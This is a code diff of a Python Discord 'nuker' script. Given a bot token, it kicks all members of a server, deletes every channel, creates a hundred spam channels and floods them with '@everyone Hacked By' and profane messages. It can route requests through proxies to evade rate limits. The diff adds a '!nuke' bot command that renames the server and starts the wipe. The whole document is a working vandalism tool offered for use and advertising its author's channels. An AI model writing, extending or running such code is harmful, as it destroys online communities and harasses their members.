@@ -1,4 +1,3 @@
-# Nuker used in GloabalMC
 from os import system
 
 
@@ -20,8 +19,10 @@ try:
     import time
     import threading
     import random
-except:
+    import discord
+    from discord.ext import commands
 
+except:
     print("Required modules not found, installing them...")
     system("python -m pip install requests")
     system("python3 -m pip install requests")
@@ -29,9 +30,10 @@ except:
     system("python3 -m pip install discord")
     print("All modules should be installed, please restart the script.")
     input("Press enter to restart...")
+
 print_logo()
 # All parameters
-LINK = 'https://tenor.com/view/milk-and-mocha-hug-cute-kawaii-love-gif-15160908 https://YouTube.com/@SpigotRCE https://discord.gg/spigotrce'
+LINK = 'https://YouTube.com/@SpigotRCE https://discord.gg/3meyfSZ37J'
 MESSAGES = [
     '@everyone Hacked By ' + LINK,
     '@everyone Fucked By ' + LINK,
@@ -47,8 +49,8 @@ CHANNEL_NAMES = [
 
 GUILD = int(input("Enter guild id: "))
 TOKEN = input("Enter token: ")
-USEPROXY = True if input("Use proxy Y/n") in ["y", "yes", "Y", "Yes", "YES"] else False
-print("Using proxies" if USEPROXY else "")
+USE_PROXY = True if input("Use proxy Y/n") in ["y", "yes", "Y", "Yes", "YES"] else False
+print("Using proxies" if USE_PROXY else "")
 headers = {'authorization': f'Bot {TOKEN}'}
 
 
@@ -86,6 +88,21 @@ def get_all_members():
     return members
 
 
+def get_all_roles():
+    roles = []
+    response = requests.get(f'https://discord.com/api/v10/guilds/{GUILD}/roles', headers=headers)
+    if response.status_code == 200:
+        roles_data = response.json()
+        roles.extend(roles_data)
+    elif response.status_code == 429:
+        time.sleep(int(response.headers.get('Retry-After', 1)))
+    else:
+        print(f"Failed to fetch roles. Status code: {response.status_code}")
+        return None
+
+    return roles
+
+
 def remove_channel(chnl):
     while True:
         r = requests.delete(f"https://discord.com/api/v10/channels/{chnl}", headers=headers, proxies=get_proxy())
@@ -93,20 +110,21 @@ def remove_channel(chnl):
             time.sleep(r.json()['retry_after'])
         else:
             if r.status_code in [200, 201, 204]:
-                print(f"[Success] Removed channel: {chnl}")
+                # print(f"[Success] Removed channel: {chnl}")
                 return
 
 
 def channel(name):
     while True:
         json = {'name': name, 'type': 0}
-        r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json, proxies=get_proxy())
+        r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json,
+                          proxies=get_proxy())
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
         else:
             if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                 id = r.json()["id"]
-                print(f"[Success] Created channel: {id}")
+                # print(f"[Success] Created channel: {id}")
                 threading.Thread(target=send_message, args=(id,)).start()
                 return
             else:
@@ -116,7 +134,8 @@ def channel(name):
 def send_message(id):
     while True:
         json = {'content': random.choice(MESSAGES)}
-        r = requests.post(f'https://discord.com/api/v10/channels/{id}/messages', headers=headers, json=json, proxies=get_proxy())
+        r = requests.post(f'https://discord.com/api/v10/channels/{id}/messages', headers=headers, json=json,
+                          proxies=get_proxy())
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
 
@@ -127,11 +146,11 @@ def kick_member(id):
         response = requests.delete(url, headers=headers, proxies=get_proxy())
 
         if response.status_code == 204:
-            print(f"Successfully kicked member: {id}")
+            # print(f"Successfully kicked member: {id}")
             return
 
 
-def remove_channels():
+def remove_channels(channel_ids):
     for channel_id in channel_ids:
         threading.Thread(target=remove_channel, args=(channel_id,)).start()
 
@@ -144,24 +163,56 @@ def remove_members():
 
 
 PROXIES = []
-with open('proxies.txt', 'r') as f:
-    for line in f.read().splitlines():
-        PROXIES.append(line)
-    print(f"Loaded {len(PROXIES)} proxies.")
+if USE_PROXY:
+    with open('proxies.txt', 'r') as f:
+        for line in f.read().splitlines():
+            PROXIES.append(line)
+        print(f"Loaded {len(PROXIES)} proxies.")
 
 
 def get_proxy():
-    if not USEPROXY:
+    if not USE_PROXY:
         return None
     PROXY = random.choice(PROXIES)
     return {"http": PROXY, "https": PROXY}
 
 
-threading.Thread(target=remove_members).start()
-channel_ids = [channel['id'] for channel in get_all_channels()]
-if len(channel_ids) != 0:
-    remove_channels()
-else:
-    print("No channels found.")
-for _ in range(100):
-    threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()
+BOT = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
+
+
+@BOT.event
+async def on_ready():
+    await BOT.change_presence(status=discord.Status.idle, activity=discord.Game(name='Nuking a server'))
+    print("Bot loaded!")
+
+
+@BOT.command()
+async def nuke(ctx):
+    await ctx.guild.edit(name="#SPIGOTRCE ON TOP")
+    await ctx.channel.delete()
+    threading.Thread(target=remove_members).start()
+    channel_ids = [c['id'] for c in get_all_channels()]
+    if len(channel_ids) != 0:
+        remove_channels(channel_ids)
+    else:
+        print("No channels found.")
+    for _ in range(100):
+        threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()
+
+
+@BOT.event
+async def on_guild_channel_create(channel):
+    print(f"Channel created {channel.id}")
+
+
+@BOT.event
+async def on_guild_channel_delete(channel):
+    print(f"Channel deleted {channel.name}")
+
+
+@BOT.event
+async def on_member_remove(member):
+    print(f"Kicked {member.name}")
+
+
+BOT.run(TOKEN)
